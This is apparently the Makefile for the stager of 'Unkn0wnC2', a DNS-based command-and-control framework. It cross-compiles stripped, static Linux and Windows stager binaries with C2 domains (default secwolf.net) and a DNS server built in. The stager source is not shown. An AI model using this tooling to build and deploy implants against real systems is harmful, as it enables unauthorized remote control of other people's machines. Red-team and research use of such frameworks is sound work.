# Unkn0wnC2 DNS Stager Makefile
# Builds lightweight C stager for multiple platforms

CC = gcc
CFLAGS = -Wall -O2 -s
LDFLAGS = -static

# Targets
TARGET_LINUX_X64 = stager-linux-x64
TARGET_WIN_X64 = stager-windows-x64.exe


# Source files
SRC = stager.c

# Default DNS server (can be overridden)
DNS_SERVER ?= 8.8.8.8
C2_DOMAINS ?= secwolf.net
DEBUG_MODE ?= 0

# Build flags
BUILD_FLAGS = -DDNS_SERVER=\"$(DNS_SERVER)\" -DC2_DOMAINS=\"$(C2_DOMAINS)\" -DDEBUG_MODE=$(DEBUG_MODE)

.PHONY: all clean linux windows x64

# Build all targets
all: linux windows

# Linux targets
linux: linux-x64

linux-x64:
	@echo "Building Linux x64 stager..."
	$(CC) $(CFLAGS) $(BUILD_FLAGS) -m64 $(SRC) -o $(TARGET_LINUX_X64) -lz
	@strip $(TARGET_LINUX_X64)
	@echo "✓ Built: $(TARGET_LINUX_X64)"

# Windows targets (cross-compile from Linux)
windows: win-x64

win-x64:
	@echo "Building Windows x64 stager..."
	x86_64-w64-mingw32-gcc $(CFLAGS) $(BUILD_FLAGS) $(SRC) -o $(TARGET_WIN_X64) -lws2_32 $(LDFLAGS)
	@strip $(TARGET_WIN_X64)
	@echo "✓ Built: $(TARGET_WIN_X64)"

# Individual architecture targets
x64: linux-x64 win-x64

# Clean build artifacts
clean:
	@echo "Cleaning stager build artifacts..."
	@rm -f $(TARGET_LINUX_X64) $(TARGET_WIN_X64)
	@echo "✓ Clean complete"

# Help
help:
	@echo "Unkn0wnC2 Stager Build System"
	@echo ""
	@echo "Targets:"
	@echo "  all         - Build all stager variants (default)"
	@echo "  linux       - Build Linux x64 variant"
	@echo "  linux-x64   - Build Linux 64-bit stager"
	@echo "  win-x64     - Build Windows 64-bit stager"
	@echo "  clean       - Remove all build artifacts"
	@echo ""
	@echo "Variables:"
	@echo "  DNS_SERVER  - DNS server to query (default: 8.8.8.8)"
	@echo "  C2_DOMAINS  - C2 domain name(s), comma-separated (default: secwolf.net)"
	@echo "  DEBUG_MODE  - Enable verbose debug output: 0=off, 1=on (default: 0)"
	@echo ""
	@echo "Example:"
	@echo "  make DNS_SERVER=1.1.1.1 C2_DOMAINS=example.com"
	@echo "  make C2_DOMAINS=errantshield.com DEBUG_MODE=1 linux-x64"
